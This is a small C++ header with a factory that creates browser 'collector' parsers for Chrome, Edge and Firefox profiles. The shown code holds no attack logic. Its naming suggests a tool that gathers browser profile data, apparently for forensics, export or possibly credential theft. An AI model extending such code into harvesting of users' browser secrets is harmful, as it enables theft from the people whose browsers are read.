#pragma once
#include "ICollector.h"
#include "ChromeParser.h"
#include "firefox_parser.h"

namespace collector
{
	enum class BrowserType
	{
		None,
		Chrome = 32,
		Edge = 33,
		Mozilla = 64,
	};

	inline ICollector* create_collector(BrowserType type_collector)
	{
		switch (type_collector)
		{
			case BrowserType::None: return nullptr;
			case BrowserType::Chrome: return new chromium_parser();
			case BrowserType::Edge: return new chromium_parser(R"(\Microsoft\Edge)");
			case BrowserType::Mozilla: return new firefox_parser();
			default: return nullptr;;
		}
	}
	
}
